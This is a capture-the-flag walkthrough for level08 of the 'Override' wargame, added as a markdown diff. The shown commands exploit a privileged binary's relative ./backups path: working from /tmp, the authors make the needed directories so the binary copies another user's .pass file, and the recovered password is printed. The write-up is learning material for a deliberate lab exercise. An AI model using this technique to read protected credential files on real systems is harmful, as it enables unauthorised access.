@@ -1,0 +1,45 @@
+# Override - level08
+
+We've started executing the binary to see what was asking.
+We can also see that there is an empty folder named backup.
+
+It asked for filename.
+
+```
+./level08 
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+```
+
+So we've tried to give filename.
+
+```
+./level08 ~level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+```
+
+We've observed that it tried to open a relative path starting with "./backups".
+The problem is that the backup folder in our directory is owned by level09 so we can't modify it.
+
+We cd to the only folder we can write to: /tmp. We created a backups folder in /tmp and a test file.
+
+Executing level08 in tmp with test as parameter we've seen that the program copied test in our backups.
+
+```
+~level08 test
+
+ls backups/
+test
+```
+
+So we've created the parent folder, changed test with the level09 directory containing the .pass file
+and we got the flag.
+
+```
+mkdir -p ./backups/home/users/level09
+
+~level08/level08 ~level09/.pass
+
+cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
+```
